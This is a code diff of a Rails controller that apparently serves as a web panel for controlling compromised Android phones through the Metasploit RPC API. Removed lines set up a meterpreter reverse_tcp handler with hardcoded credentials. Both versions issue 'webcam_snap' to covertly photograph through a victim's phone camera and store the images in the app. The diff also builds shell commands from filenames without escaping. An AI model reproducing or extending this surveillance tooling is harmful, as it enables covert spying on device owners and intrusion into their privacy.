@@ -31,55 +31,44 @@ class PicturesController < InheritedResources::Base
     #     end
     # end
 
-
+    #handle no session issue!
     def take_picture
-        require 'msfrpc-client'
+        commandTimeout=20
+        downloadTimeout=20
+        @smartphone = Smartphone.find(params[:smartphone_id])
 
-        user = 'cool'
-        pass = 'looc'
-        
-        opts = {
-          host: '127.0.0.1',
-          port: 3333,
-          uri:  '/api/',
-          ssl:  true
-        }
-        rpc = Msf::RPC::Client.new(opts)
-        rpc.login(user, pass)
-        
-        opts = {
-          host: '127.0.0.1',
-          port: 3333,
-          uri:  '/api/',
-          ssl:  true
-        }
-        
-        pay_opts = {
-          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
-          'LHOST'   => '0.0.0.0',
-          'LPORT'   => 4444
-        }
-        job = rpc.call('module.execute', 'exploit', 'multi/handler', pay_opts)
-        
-        session=rpc.call('session.list').keys[0]
-        require 'date'
-        current_time = DateTime.now
-        @file_name= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M_%S") + '.jpeg'
-        puts @file_name
-        puts rpc.call('session.meterpreter_write', session, "webcam_snap -q 100 -i 1 -p #{@file_name}")
-        sleep 2
-        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
-        while not system("docker exec kali_container ls | grep #{@file_name}") do
-            puts "Waiting ..."
-        end
-        copyPictureCommand="docker cp kali_container:/#{@file_name} app\\assets\\images\\files\\pictures\\#{@file_name}"
-        system(copyPictureCommand)
-        puts @file_name
-        respond_to do |format|
-            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @file_name}  }
+        currentTime = DateTime.now
+        currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
+        @fileName= "webcam_snap_" + currentTimeFormat + '.jpeg'
+        processCommand="webcam_snap -q 100 -i 1 -p #{@fileName}"
+        commandOutput=start_msf_process(processCommand)
+
+        1.upto(commandTimeout) do |n|
+            if system("docker exec kali_container ls | grep #{@fileName}")
+                break
+            else
+                puts "Waiting ..."
+            end
+            sleep 1
           end
+        copyPictureCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\pictures\\#{@fileName}"
+        system(copyPictureCommand)
 
+        fullPath="app\\assets\\images\\files\\pictures\\" + @fileName
+        isOperationSuccessful=false
+        1.upto(downloadTimeout) do |n|
+            if File.file?(fullPath)
+                newPicture=Picture.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
+                newPicture.save!
+                isOperationSuccessful = true
+                break
+            end 
+        end
+        commandOutput=["Operation Failed"] if not isOperationSuccessful
 
+        respond_to do |format|
+            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
+          end
     end
 
 
